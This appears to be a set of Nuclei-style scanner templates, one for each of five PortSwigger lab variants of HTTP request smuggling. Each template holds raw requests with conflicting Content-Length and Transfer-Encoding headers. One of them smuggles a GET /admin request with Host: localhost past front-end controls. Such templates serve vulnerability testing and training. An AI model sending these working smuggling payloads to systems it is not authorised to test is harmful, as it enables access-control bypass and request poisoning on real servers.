### Basic CL.TE

```yaml
id: CL.TE-http-smuggling

info:
  name: HTTP request smuggling, basic CL.TE vulnerability
  author: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
  severity: info

requests:
  - raw:
    - |
      POST / HTTP/1.1
      Host: {{Hostname}}
      Connection: keep-alive
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 6
      Transfer-Encoding: chunked
      
      0
      
      G
    - |
      POST / HTTP/1.1
      Host: {{Hostname}}
      Connection: keep-alive
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 6
      Transfer-Encoding: chunked
      
      0
      
      G
      
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "Unrecognized method GPOST")'
```

### Basic TE.CL

```yaml
id: TE.CL-http-smuggling

info:
  name: HTTP request smuggling, basic TE.CL vulnerability
  author: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
  severity: info

requests:
  - raw:
    - |
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked
      
      5c
      GPOST / HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15
      
      x=1
      0
    - |
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked
      
      5c
      GPOST / HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15
      
      x=1
      0
      
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "Unrecognized method GPOST")'
```

### Frontend bypass CL.TE

```
id: smuggling-bypass-front-end-controls-cl-te

info:
  name: HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
  author: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te
  severity: info

requests:
  - raw:
    - |
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 116
      Transfer-Encoding: chunked
      
      0
      
      GET /admin HTTP/1.1
      Host: localhost
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 10
      
      x=
    - |
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 116
      Transfer-Encoding: chunked
      
      0
      
      GET /admin HTTP/1.1
      Host: localhost
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 10
      
      x=
      
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "/admin/delete?username=carlos")'
```

### Differential responses based CL.TE

```yaml
id: confirming-cl-te-via-differential-responses-http-smuggling

info:
  name: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
  author: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses
  severity: info

requests:
  - raw:
    - |
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 35
      Transfer-Encoding: chunked
      
      0
      
      GET /404 HTTP/1.1
      X-Ignore: X
    - |
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 35
      Transfer-Encoding: chunked
      
      0
      
      GET /404 HTTP/1.1
      X-Ignore: X
      
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code==404'
```

### Differential responses based TE.CL

```yaml
id: confirming-te-cl-via-differential-responses-http-smuggling

info:
  name: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
  author: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses
  severity: info

requests:
  - raw:
    - |
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked
      
      5e
      POST /404 HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15
      
      x=1
      0
    - |
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked
      
      5e
      POST /404 HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15
      
      x=1
      0
      
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code==404'
```
